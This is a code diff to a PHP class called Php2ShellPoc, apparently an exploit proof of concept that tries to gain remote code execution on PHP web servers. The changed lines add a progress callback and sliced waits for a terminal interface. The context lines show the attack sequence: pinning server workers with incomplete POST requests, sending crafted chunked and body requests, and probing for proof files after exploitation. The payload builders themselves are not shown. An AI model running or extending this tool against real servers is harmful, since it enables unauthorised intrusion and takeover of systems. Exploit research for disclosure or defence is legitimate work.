@@ -22,9 +22,14 @@ final class Php2ShellPoc
     ) {
     }
 
-    public function stage1(Target $target, Profile $profile, ?int $workers = null, ?int $timeout = null): PocResult
-    {
-        return $this->execute($target, $profile, false, false, $workers, $timeout);
+    public function stage1(
+        Target $target,
+        Profile $profile,
+        ?int $workers = null,
+        ?int $timeout = null,
+        ?\Closure $onTick = null,
+    ): PocResult {
+        return $this->execute($target, $profile, false, false, $workers, $timeout, $onTick);
     }
 
     public function run(
@@ -33,8 +38,9 @@ final class Php2ShellPoc
         bool $allowUnverified = false,
         ?int $workers = null,
         ?int $timeout = null,
+        ?\Closure $onTick = null,
     ): PocResult {
-        return $this->execute($target, $profile, true, $allowUnverified, $workers, $timeout);
+        return $this->execute($target, $profile, true, $allowUnverified, $workers, $timeout, $onTick);
     }
 
     private function execute(
@@ -44,6 +50,7 @@ final class Php2ShellPoc
         bool $allowUnverified,
         ?int $workersOverride,
         ?int $timeoutOverride,
+        ?\Closure $onTick,
     ): PocResult {
         if (!$profile->rceVerified() && !$allowUnverified) {
             return new PocResult(false, 'profile is not verified');
@@ -121,6 +128,7 @@ final class Php2ShellPoc
                 $allFree = true;
 
                 foreach ($proofCandidates as $candidate) {
+                    $this->tick($onTick);
                     $response = $this->client?->get(self::origin($scheme, $host, $port) . $candidate, $target->requestHeaders());
 
                     if ($response === null || $response->getStatusCode() !== 404) {
@@ -150,15 +158,20 @@ final class Php2ShellPoc
         $b2 = null;
 
         try {
+            $this->tick($onTick);
             $raw = new RawHttp($scheme, $host, $port, (float) $timeout, $target->requestHeaders());
             $holders = 0;
 
             if ($workers > 1) {
                 for ($i = 0; $i < $workers - 1; $i++) {
+                    if (microtime(true) > $deadline) {
+                        return new PocResult(false, 'PoC deadline exceeded during worker pinning', terminal: true);
+                    }
+
                     try {
                         $raw->openIncompletePost($path, 1048576);
                         $holders++;
-                        usleep(10_000);
+                        $this->wait(10_000, $onTick);
                     } catch (\Throwable) {
                         break;
                     }
@@ -168,7 +181,7 @@ final class Php2ShellPoc
                     return new PocResult(false, sprintf('worker pinning failed (%d/%d holders)', $holders, $workers - 1), terminal: true);
                 }
 
-                usleep(800_000);
+                $this->wait(800_000, $onTick);
             }
 
             if (microtime(true) > $deadline) {
@@ -186,8 +199,9 @@ final class Php2ShellPoc
             $builder->a1($a1, $a1Big);
 
             $a1Path = $path . (str_contains($path, '?') ? '&' : '?') . $a1Query;
+            $this->tick($onTick);
             $raw->sendChunked($a1Path, $a1);
-            usleep(200_000);
+            $this->wait(200_000, $onTick);
 
             if (microtime(true) > $deadline) {
                 return new PocResult(false, 'PoC deadline exceeded before the leak request', terminal: true);
@@ -251,17 +265,19 @@ final class Php2ShellPoc
             }
 
             $builder->a2($a2, $a2Parts, $a2Depth, $a2Fillers);
+            $this->tick($onTick);
             $raw->sendBody($path, $a2, self::CONTENT_TYPE);
-            usleep(200_000);
+            $this->wait(200_000, $onTick);
 
             if (microtime(true) > $deadline) {
                 return new PocResult(false, 'PoC deadline exceeded before the carrier request', terminal: true);
             }
 
             $builder->b2($b2, $carrier, $s, $b2Vl, $b2N1, $b2N2);
+            $this->tick($onTick);
             $raw->sendBody($path, $b2, self::CONTENT_TYPE);
 
-            usleep(600_000);
+            $this->wait(600_000, $onTick);
 
             $evidenceBase = [
                 'profile' => $profile->id(),
@@ -313,6 +329,27 @@ final class Php2ShellPoc
                     @unlink($pathToDelete);
                 }
             }
+        }
+    }
+
+    private function tick(?\Closure $onTick): void
+    {
+        if ($onTick !== null) {
+            $onTick();
+        }
+    }
+
+    /**
+     * Waits in small slices so the TUI can redraw and handle a restart.
+     */
+    private function wait(int $microseconds, ?\Closure $onTick): void
+    {
+        while ($microseconds > 0) {
+            $this->tick($onTick);
+
+            $slice = min($microseconds, 50_000);
+            usleep($slice);
+            $microseconds -= $slice;
         }
     }
 
